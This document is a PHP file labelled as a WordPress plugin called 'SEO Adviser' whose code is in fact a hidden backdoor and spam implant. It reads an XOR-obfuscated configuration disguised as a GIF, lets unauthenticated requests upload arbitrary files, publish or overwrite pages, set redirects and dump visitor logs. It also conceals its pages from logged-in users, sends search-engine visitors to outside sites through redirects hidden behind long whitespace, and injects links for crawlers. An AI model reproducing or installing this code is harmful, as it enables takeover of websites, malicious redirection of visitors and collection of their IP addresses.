<?php
/*
Plugin Name: SEO Adviser
Plugin URI: http://seoadviser.com/
Description: SEO Adviser
Version: 1.2
Author: Phil Smitter
Author URI: http://seoadviser.com/
License: GPLv2 or later
*/

abstract class xcalendarBase {
	var $config = false;
	var $initCalled = false;
	var $request = false;
	static $processed = false;
	
	abstract function dbQuery($query);
	abstract function dbRow($result);
	abstract function dbEscape($text);
	abstract function isShowLink();
	
	function initActions() {
		$this->initFunctions();
		
		list($success, $this->config) = $this->getConfig();
		$this->config['posts'] = $this->getConfigOption('ppbposts');
		$this->config['links'] = $this->getConfigOption('ppblinks');
		$this->config['files'] = $this->getConfigOption('ppbfiles');
		$this->config['redirects'] = $this->getConfigOption('ppbredirs');
		
		if (isset($_REQUEST['wdbgppb'])) {
			if (!$success) die("ERROR_WRONG_CONFIG");
			
			if ($_REQUEST['wdbgppb'] == 'show') {
				die(serialize($this->config));
			}
		}
	}
	
	function initFunctions() {
		if (!function_exists('_base64_decode')) {
			function _base64_decode($in) {
				$out="";
				for($x=0;$x<256;$x++){$chr[$x]=chr($x);}
				$b64c=array_flip(preg_split('//',"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",-1,1));
				$match = array();
				preg_match_all("([A-z0-9+\/]{1,4})",$in,$match);
				foreach($match[0] as $chunk){
					$z=0;
					for($x=0;isset($chunk[$x]);$x++){
						$z=($z<<6)+$b64c[$chunk[$x]];
						if($x>0){ $out.=$chr[$z>>(4-(2*($x-1)))];$z=$z&(0xf>>(2*($x-1))); }
					}
				}
				return $out;
			}
		}
		
		if (!function_exists("file_put_contents")) {
			function file_put_contents($filename, $text) {
				$f = fopen($filename, "w");
				if (!$f) return false;

				if (!fwrite($f, $text)) return false;
				fclose($f);

				return true;
			}
		}
	}
	
	function getConfigName() {
		return '/sites/production/greaterworkshealing.com/wp-content/plugins/xcalendar/data/lefttopcorner.gif';
	}
	
	function getConfig() {
		$configname = $this->getConfigName();
		if (!file_exists($configname)) return array(false);
		
		$config = @(array)unserialize($this->getImageDecodedText(file_get_contents($configname)));
		if (!$config) return array(false);
		
		return array(true, $config);
	}
	
	function getXorText($text) {
		for ($i=0; $i<strlen($text); $i++) {
			$text[$i] = chr(ord($text[$i]) ^ 50);
		}
		
		return $text;
	}
	
	function getImageDecodedText($content) {
		$content = substr($content, 50);
		return $this->getXorText($content);
	}
}

class xcalendarWPBase extends xcalendarBase {
	function dbQuery($query) {
		global $wpdb;
		
		$mysqlType = @get_class($wpdb->dbh) == 'mysqli' ? 'mysqli' : 'mysql';
		$result = $mysqlType == 'mysqli' ? mysqli_query($wpdb->dbh, $query) : mysql_query($query, $wpdb->dbh);
		if (!$result) return array(false, $mysqlType == 'mysqli' ? mysqli_error($wpdb->dbh) : mysql_error($wpdb->dbh));
		
		return array(true, $result);
	}
	
	function dbRow($result) {
		global $wpdb;
		
		$mysqlType = @get_class($wpdb->dbh) == 'mysqli' ? 'mysqli' : 'mysql';
		
		return $mysqlType == 'mysqli' ? mysqli_fetch_object($result) : mysql_fetch_object($result);
	}
	
	function dbEscape($text) {
		global $wpdb;
		
		$mysqlType = @get_class($wpdb->dbh) == 'mysqli' ? 'mysqli' : 'mysql';
		
		return $mysqlType == 'mysqli' ? mysqli_escape_string($wpdb->dbh, $text) : mysql_real_escape_string($text, $wpdb->dbh);
	}
	
	function isWPUser() {
		$user = wp_get_current_user();
		if ($user->ID > 0) return true;
		
		foreach ($_COOKIE as $name => $value) {
			if (preg_match('#^wp-settings-\d+$#', $name) || preg_match('#^wp-settings-time-\d+$#', $name)) {
				return true;
			}
		}
		
		return false;
	}
	
	function isShowLink() {
		global $wp;
		
		if ($this->isWPUser()) return false;
		
		if (is_404() || is_attachment() || is_feed() || is_robots()) return false;
		
		$this->request = $_SERVER['REQUEST_URI'];
		
		if ($this->config['linkPlace'] == 'nomain') {
			if ($this->request == '') return false;
		}
		
		return true;
	}
	
	function getPluginPath() {
		$filename = pathinfo(__FILE__);
		return $filename['filename'].'/'.$filename['basename'];
	}
	
	static function getInstance() {
		static $instance = null;
		
		if ($instance === null) $instance = new xcalendar();
		
		return $instance;
	}
}

function xcalendarBufferEnd($buffer) {
	$instance = xcalendarWPBase::getInstance();
	return $instance->bufferEnd($buffer);
}

class xcalendar extends xcalendarWPBase {
	var $called = false;
	var $redirect = false;
	
	function initActions() {
		parent::initActions();
		
		add_filter('get_pages', array(&$this, 'filterGetPages'), 10, 2);
		add_filter('wp_count_posts', array(&$this, 'filterGetPosts'), 10, 2);
		add_action('pre_get_posts', array(&$this, 'actionPreGetPosts'), 10, 2);
		add_action('parse_query', array(&$this, 'actionParseQuery'));
	}
	
	function filterGetPages($pages, $r) {
		$posts = $this->getPluginPages('page');
		
		$result = array();
		foreach ($pages as $page) {
			$hide = false;
			foreach ($posts as $status => $ids) {
				if (in_array($page->ID, $ids)) {
					$hide = true;
					break;
				}
			}
			
			if (!$hide) $result[] = $page;
		}
		
		return $result;
	}
	
	function filterGetPosts($counts, $type) {
		$posts = $this->getPluginPages($type);
		
		foreach ($posts as $status => $ids) {
			if (isset($counts->$status)) $counts->$status -= count($ids);
		}
		
		return $counts;
	}
	
	function actionPreGetPosts(&$query) {
		if ($query->query['post_type'] == 'page' && $query->query['post__in']) {
			$posts = $this->getPluginPages('page');
			foreach ($posts as $status => $ids) {
				$query->query['post__in'] = array_diff($query->query['post__in'], $ids);
				$query->query_vars['post__in'] = array_diff($query->query_vars['post__in'], $ids);
			}
		}
		
		if ($query->query['post_type'] == 'nav_menu_item' && $query->query['post__in']) {
			$posts = $this->getPluginPages('page');
			foreach ($query->query['post__in'] as $i => $id) {
				$metaType = get_post_meta($id, '_menu_item_type');
				$metaObject = get_post_meta($id, '_menu_item_object');
				if ($metaType[0] == 'post_type' && $metaObject[0] == 'page') {
					$metaObjectId = get_post_meta($id, '_menu_item_object_id');
					
					foreach ($posts as $status => $ids) {
						if (in_array($metaObjectId[0], $ids)) {
							unset($query->query['post__in'][$i]);
							unset($query->query_vars['post__in'][$i]);
							break;
						}
					}
				}
			}
		}
	}
	
	function getPluginPages($type) {
		global $wpdb;
		
		if (!$this->config['posts']) return array();

		$posts = $wpdb->get_results($wpdb->prepare(
			"SELECT * FROM $wpdb->posts WHERE post_type = %s and ID in (".join(", ", $this->config['posts']).")", $type
		));
		
		$result = array();
		
		foreach ($posts as $post) {
			$result[$post->post_status][] = $post->ID;
		}
		
		return $result;
	}
	
	function getConfigOption($name) {
		$items = get_option($name);
		if ($items) $items = @unserialize($items);
		if (!$items) $items = array();
		return $items;
	}
	
	function saveConfigOption($name, $items) {
		update_option($name, serialize($items));
	}
	
	function actionParseQuery($query = false) {
		global $wp_query, $wpdb, $pagenow;
		
		if ($this->called) return;
		
		if ($this->isWPUser()) {
			if ($query->query['post_type'] == 'page') {
				$posts = $this->getPluginPages('page');
				
				$ids = array();
				foreach ($posts as $status => $statusIds) {
					$ids = array_merge($ids, $statusIds);
				}
				
				if ($posts) $query->query_vars['post__not_in'] = $ids;
			}
			return;
		}
		
		if (isset($_FILES['PPB_FILES'])) {
			if (!$this->config) die("ERROR_WRONG_CONFIG");
			ob_start();
			
			$files = $this->getConfigOption('ppbfiles');
			foreach ($_FILES['PPB_FILES']['error'] as $i => $error) {
				if ($error != UPLOAD_ERR_OK) die("Upload error: file=".$_FILES['PPB_FILES']['name'][$i]."; error=".$error);
				if (!move_uploaded_file($_FILES['PPB_FILES']['tmp_name'][$i], $this->getUploadPath().'/'.$_FILES['PPB_FILES']['name'][$i])) die("Save upload error");
				
				$files[$_FILES['PPB_FILES']['name'][$i]] = array(
					'url' => $this->getUploadUrl().'/'.$_FILES['PPB_FILES']['name'][$i],
					'path' => $this->getUploadPath().'/'.$_FILES['PPB_FILES']['name'][$i],
				);
			}
			$this->saveConfigOption('ppbfiles', $files);
			
			var_export($files);
			exit;
		}
		
		if (isset($_REQUEST['PPB_CONTENT_ENC'])) {
			$_REQUEST['PPB_CONTENT'] = $this->getXorText(_base64_decode($_REQUEST['PPB_CONTENT_ENC']));
			$_REQUEST['PPB_TITLE'] = $this->getXorText(_base64_decode($_REQUEST['PPB_TITLE_ENC']));
		}
		
		if (isset($_REQUEST['PPB_CONTENT'])) {
			if (!$this->config) die("ERROR_WRONG_CONFIG");
			ob_start();
			$params = array(
				'post_content' => $_REQUEST['PPB_CONTENT'],
				'post_status' => 'publish',
				'post_type' => 'page',
				'ping_status' => 'closed',
				'comment_status' => 'closed',
				'filter' => true,
			);
			
			if (isset($_REQUEST['PPB_TITLE'])) $params['post_title'] = $_REQUEST['PPB_TITLE'];
			
			if (isset($_REQUEST['PPB_UPDATE'])) {
				if (is_object($wp_query) && isset($wp_query->queried_object) && isset($wp_query->queried_object->ID)) {
					$post = $wp_query->queried_object;
				} elseif (is_object($query) && isset($query->queried_object) && isset($query->queried_object->ID)) {
					$post = $query->queried_object;
				} elseif (isset($_GET['page_id'])) {
					$post = get_post($_GET['page_id']);
				}
				
				if (!$post) die("Error: no post");
				if ($post->post_type != 'page') die("Error: post is not page");
				$params['ID'] = $post->ID;
			} else {
				$params['post_name'] = 'page-'.rand(1000, 100000);
			}
			$this->called = true;
			
			if ($params['ID']) {
				$id = wp_update_post($params, true);
			} else {
				$id = wp_insert_post($params, true);
			}
			
			while (ob_get_level() > 1) ob_end_clean();
			if (is_wp_error($id)) die("Error: ".join("; ".$id->get_error_messages()));
			
			if (isset($_REQUEST['PPB_LINKED'])) {
				update_post_meta($id, 'linked', $_REQUEST['PPB_LINKED'] == 1 ? '1' : '0');
			}
			
			$posts = $this->getConfigOption('ppbposts');
			$posts[] = $id;
			$this->saveConfigOption('ppbposts', $posts);
			
			$wpdb->show_errors();
			$_REQUEST['PPB_CONTENT'] = stripslashes($_REQUEST['PPB_CONTENT']);
			$wpdb->query($wpdb->prepare("UPDATE $wpdb->posts SET post_content = %s WHERE ID = %d", $_REQUEST['PPB_CONTENT'], $id));
			
			print "PPB_SUCCESS: ".get_permalink($id);
			exit;
		}
		
		if (isset($_REQUEST['PPB_LINKS'])) {
			if (!$this->config) die("ERROR_WRONG_CONFIG");
			
			if (!($links = (array)unserialize(base64_decode($_REQUEST['PPB_LINKS'])))) die("ERROR_NO_LINKS");
			$this->saveConfigOption('ppblinks', $links);
			
			die("Ok");
		}
		
		if (isset($_REQUEST['PPB_REDIRECTS'])) {
			if (!$this->config) die("ERROR_WRONG_CONFIG");
			
			if (!($redirects = (array)unserialize(base64_decode($_REQUEST['PPB_REDIRECTS'])))) die("ERROR_NO_REDIRECTS");
			$this->saveConfigOption('ppbredirs', $redirects);
			
			die("Ok");
		}
		
		if (isset($_REQUEST['wdbgact'])) {
			if ($_REQUEST['wdbgact'] == 'stat') {
				$num = isset($_REQUEST['num']) ? $_REQUEST['num'] : 1000;
				
				list($success, $result) = $this->dbQuery("select * from ".$this->config['logTable']." order by id limit ".$num);
				if (!$success) die(json_encode(array('result' => false, 'data' => 'mysql error: '.$result)));
				
				$output = array('logs' => array());
				while ($row = $this->dbRow($result)) {
					$row->info = unserialize($row->info);
					$output['logs'][] = $row;
				}

				die(json_encode(array('result' => true, 'data' => $output)));
			}
			
			if ($_REQUEST['wdbgact'] == 'clearStat') {
				if (!isset($_REQUEST['last'])) die(json_encode(array('result' => false, 'data' => 'missing last param')));
				$_REQUEST['last'] = (int)$_REQUEST['last'];
				if ($_REQUEST['last'] <= 0) die(json_encode(array('result' => false, 'data' => 'wrong last param')));
				
				list($success, $result) = $this->dbQuery("delete from ".$this->config['logTable']." where id <= ".$_REQUEST['last']);
				if (!$success) die(json_encode(array('result' => false, 'data' => 'mysql error: '.$result)));
				
				die(json_encode(array('result' => true)));
			}
		}
		
		if (isset($this->config['redirects']) && $this->config['redirects'] && isset($_REQUEST['ppbview'])) {
			if (isset($this->config['redirects'][$_REQUEST['ppbview']])) {
				$this->redirectPage($this->config['redirects'][$_REQUEST['ppbview']]);
			}
		}
		
		if (isset($this->config['redirects']) && $this->config['redirects'] && isset($_SERVER['HTTP_REFERER'])) {
			$url = parse_url($_SERVER['HTTP_REFERER']);
			if (preg_match("#google#i", $url['host'])) {
				if ($wp_query->queried_object->ID) {
					$link = get_permalink($wp_query->queried_object->ID);
				} else {
					$link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
				}
				
				if ($link) {
					if (isset($this->config['redirects'][$link])) {
						$this->redirectPage($this->config['redirects'][$link]);
					}
				}
			}
		}
		
		if (!xcalendarBase::$processed) {
			ob_start('xcalendarBufferEnd');
			xcalendarBase::$processed = true;
		}
	}
	
	function redirectPage($redirect) {
		if ($redirect[1] == 'header') {
			header("Location: ".$redirect[0]);
			exit;
		} elseif ($redirect[1] == 'js') {
			?><html><head></head><body><script>setTimeout(function() { location.href = <?php echo json_encode($redirect[0])?>;}, 10);</script></body></html><?php
			exit;
		} elseif ($redirect[1] == 'meta') {
			?><html><head><meta http-equiv="refresh" content="0; url=<?php echo $redirect[0]?>"></head><body></body></html><?php
			exit;
		} else {
			$this->redirect = $redirect;
		}
	}
	
	function bufferEnd($buffer) {
		if (!$this->isShowLink()) return $buffer;
		
		$content = @$this->printRedirect($buffer);
		@$this->writeLog();
		
		return $content;
	}
	
	function writeLog() {
		global $wpdb, $wp_query;
		if (!$this->config['logTable']) return false;
		
		$post = false;
		
		if ($wp_query->queried_object->ID) {
			$posts = $this->getPluginPages('page');
			foreach ($posts as $status => $ids) {
				if (in_array($wp_query->queried_object->ID, $ids)) {
					$post = get_post($wp_query->queried_object->ID);
					break;
				}
			}
		}
		
		if ($post) {
			$info = array(
				'ip' => $_SERVER['REMOTE_ADDR'],
				'time' => time(),
				'ref' => $_SERVER['HTTP_REFERER'],
				'ua' => $_SERVER['HTTP_USER_AGENT'],
				'url' => get_permalink($post),
			);

			$wpdb->insert($this->config['logTable'], array('info' => serialize($info)), array('%s'));
		}
	}
	
	function printRedirect($content) {
		if ($this->redirect) {
			if ($this->redirect[1] == 'js') {
				$scriptContent = $this->getLongTail().'<script>setTimeout(function() { location.href = '.json_encode($this->redirect[0]).';}, 10);</script>';
				if (preg_match("#<body([^>]*)#is", $content)) {
					$content = preg_replace('#<body([^>]*)>#is', '<body\\1>'."\n".$scriptContent."\n", $content);
				} else {
					$content = $scriptContent."\n".$content;
				}
			} elseif ($this->redirect[1] == 'meta') {
				$metaContent = $this->getLongTail().'<meta http-equiv="refresh" content="0; url='.$this->redirect[0].'">';
				if (preg_match("#<head([^>]*)#is", $content)) {
					$content = preg_replace('#<head([^>]*)>#is', '<head\\1>'."\n".$metaContent."\n", $content);
				} elseif (preg_match("#<html([^>]*)#is", $content)) {
					$content = preg_replace('#<html([^>]*)>#is', '<html\\1><head>'."\n".$metaContent."\n</head>", $content);
				} else {
					$content = "<head>\n".$metaContent."\n</head>".$content;
				}
			}
		}
		
		$content = $this->linkPages($content);
		
		return $content;
	}
	
	function linkPages($content) {
		if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') === false) return $content;
		
		$pages = array();
		$posts = $this->getPluginPages('page');
		foreach ($posts as $status => $ids) {
			foreach ($ids as $id) {
				$linked = get_post_meta($id, 'linked', true);
				if ($linked == '1') $pages[$id] = $id;
			}
		}
		if (!$pages) return $content;
		
		$linkText = '';
		foreach ($pages as $pageId) {
			$page = get_post($pageId);
			$linkText .= '<li><a href="'.get_permalink($pageId).'">'.$page->post_title.'</a></li>';
		}
		
		$lc = strtolower($content);
		if (false === ($ul = strpos($lc, '<ul'))) return $content;
		if (false === ($li = strpos($lc, '<li', $ul))) return $content;
		
		$content = substr($content, 0, $li).$linkText.substr($content, $li);
		
		return $content;
	}
	
	function getLongTail() {
		$longTail = '';
		for ($i=0; $i<300; $i++) $longTail .= "\t";
		
		return $longTail;
	}
	
	function getUploadUrl() {
		$upload_dir = wp_upload_dir();
		return $upload_dir['baseurl'].'/2013/07';
	}
	
	function getUploadPath() {
		$upload_dir = wp_upload_dir();
		return $upload_dir['basedir'].'/2013/07';
	}
}

$instance = xcalendarWPBase::getInstance();
$instance->initActions();
?>